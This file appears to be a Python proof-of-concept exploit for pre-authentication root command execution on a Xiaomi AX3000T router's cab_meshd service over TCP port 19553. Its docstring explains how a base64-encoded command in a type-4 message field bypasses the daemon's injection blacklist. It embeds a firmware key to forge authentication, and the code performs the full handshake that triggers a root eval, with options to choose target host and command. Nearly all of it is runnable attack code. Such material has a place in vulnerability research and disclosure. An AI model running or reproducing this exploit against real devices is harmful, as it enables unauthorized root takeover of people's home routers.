#!/usr/bin/env python3
"""V2 — cab_meshd pre-auth root command execution (CAP/LAN path).

Runs a shell command as root on a Xiaomi AX3000T (RD03v2, stock 2.0.28) CAP over
TCP 19553 with no credentials. Confirmed end-to-end in emulation on the stock
binary + shell scripts: the daemon-driven 4->5->7 handshake below drove the
mimesh_init eval and created a root-owned file.

Delivery (this is the part an earlier version got wrong): the base64'd command must
go in the TYPE-4 PLANT field, body[0x90] -> conn+0x10e, NOT in the MAC header field.
A five-word pad shifts the base64 into do_cap_init's $6, which is base64 -d'd into
mimesh_init's eval:
    type-4 body[0x90] = "a a a a a " + base64(`CMD`)
      -> run_with_lock $@ re-splits -> do_cap_init $6 = base64(`CMD`)
      -> base64 -d -> `CMD` -> eval (root)

Constraints (CAP/LAN path):
  * The plant is 19 bytes. After the 10-byte "a a a a a " pad, ~8 base64 chars fit
    -> ~6 raw bytes incl. backticks -> a ~4-character command. This is a genuine
    but tightly-budgeted gate-open primitive. The separate RE/WAN path has a
    larger 32/64-byte reliable budget and is confirmed end-to-end on hardware.
  * A completed cap_init can set NETMODE=whc_cap and close the sink. Normal web
    setup can set the same mode without a prior exploit. Treat the trigger as
    potentially one-shot and check the mode before using it.
  * The C blacklist (check_injection, 0xe2c9) is bypassed structurally: cab_meshd
    base64-encodes the field before checking, so the blacklist only sees base64.

Usage:
    ./rce_poc.py --host 192.168.31.1 --cmd 'id'      # ~4-char budget: id, >W, etc.
    ./rce_poc.py --host 192.168.31.1 --raw '`>W`'    # exact backtick expr
"""
import argparse
import base64
import hashlib
import hmac
import socket
import ssl
import struct
import sys
import time

CONST = b"838d364d8ed3bd085e150211ea6b3715"   # firmware-global key literal @0xcabb
VER = 0x1001
HDR = 0x2c
PLANT_OFF = 0x90          # type-4 body offset -> conn+0x10e
PLANT_MAX = 0x13          # 19 bytes (strncpy bound at 0x6058)
PAD = b"a a a a a "       # 5 words -> do_cap_init $1..$5 ; next word becomes $6


def q_pass(ident: bytes) -> bytes:
    # server verifies incoming auth with the 'q' key variant (0x499c: r0 = 1-mode)
    return base64.b64encode(hmac.new(b"q" + CONST[1:], ident, hashlib.sha256).digest())


def log(m):
    print(m, flush=True)


def hdr(typ, blen):
    h = bytearray(HDR)
    h[0:2] = struct.pack(">H", VER)
    h[2:4] = struct.pack(">H", blen)
    h[4:6] = struct.pack(">H", typ)
    return bytes(h)


def run(host, port, ident, b64cmd, timeout, hold):
    plant = PAD + b64cmd
    if len(plant) > PLANT_MAX:
        raise SystemExit(
            f"plant {len(plant)}B > {PLANT_MAX}B: base64 payload is {len(b64cmd)}B, "
            f"max {PLANT_MAX - len(PAD)}B here (~4-char command). Use the RE/WAN path "
            "for longer payloads.")
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    try:
        ctx.set_ciphers("ALL:@SECLEVEL=0")
    except ssl.SSLError:
        pass
    # cab_meshd's small slot pool can stall the first handshake; retry.
    s = None
    for _i in range(4):
        try:
            s = ctx.wrap_socket(socket.create_connection((host, port), timeout=timeout))
            break
        except (TimeoutError, socket.timeout, ssl.SSLError, OSError) as _e:
            if _i == 3:
                raise
            log(f"[!] TLS connect {_i+1}/4 failed ({type(_e).__name__}); "
                f"cab_meshd slot busy, waiting 15s")
            time.sleep(15)
    log(f"[+] TLS up {s.version()} (no client cert)")

    # 1) type-4 auth: id@0, pass@0x10 (q-key); command (base64) in the PLANT @0x90
    b4 = bytearray(0xa4)
    b4[0:len(ident)] = ident
    p = q_pass(ident)
    b4[0x10:0x10 + len(p)] = p
    b4[PLANT_OFF:PLANT_OFF + len(plant)] = plant
    s.sendall(hdr(4, len(b4)) + bytes(b4))
    log(f"[+] type-4 auth sent; plant@0x90 = {plant.decode()!r}")
    time.sleep(1.0)

    # 2) type-5 -> ST_RUNNING (server then pushes its type-6 config)
    b5 = bytearray(0x20)
    b5[0] = 1
    s.sendall(hdr(5, len(b5)) + bytes(b5))
    log("[+] type-5 auth-reply sent -> ST_RUNNING")
    time.sleep(1.5)
    s.settimeout(2.0)
    try:
        s.recv(4096)
    except (socket.timeout, ssl.SSLWantReadError, OSError):
        pass

    # 3) type-7 -> cap_init; the eval runs only if the CAP mode gate is open.
    b7 = bytearray(0x110)
    b7[0] = 1
    s.sendall(hdr(7, len(b7)) + bytes(b7))
    log("[+] type-7 trigger sent -> cap_init (eval requires a gate-open mode)")
    time.sleep(hold)
    try:
        s.close()
    except OSError:
        pass
    log("[*] done  (cap_init may have changed NETMODE; check before any rerun)")


def main():
    ap = argparse.ArgumentParser(description=__doc__.split("\n")[0])
    ap.add_argument("--host", default="192.168.31.1")
    ap.add_argument("--port", type=int, default=19553)
    ap.add_argument("--id", default="poc00010203")
    ap.add_argument("--timeout", type=float, default=20.0)
    ap.add_argument("--hold", type=float, default=8.0)
    g = ap.add_mutually_exclusive_group()
    g.add_argument("--cmd", help="shell command; wrapped in backticks and base64'd")
    g.add_argument("--raw", help="exact backtick/${} expression, e.g. '`>W`'")
    args = ap.parse_args()

    expr = args.raw if args.raw else "`" + (args.cmd or "id") + "`"
    b64 = base64.b64encode(expr.encode())
    log(f"[*] target {args.host}:{args.port}  expr={expr!r}  base64={b64.decode()}  "
        f"(plant budget: base64 <= {PLANT_MAX - len(PAD)}B)")
    run(args.host, args.port, args.id.encode(), b64, args.timeout, args.hold)


if __name__ == "__main__":
    sys.exit(main())
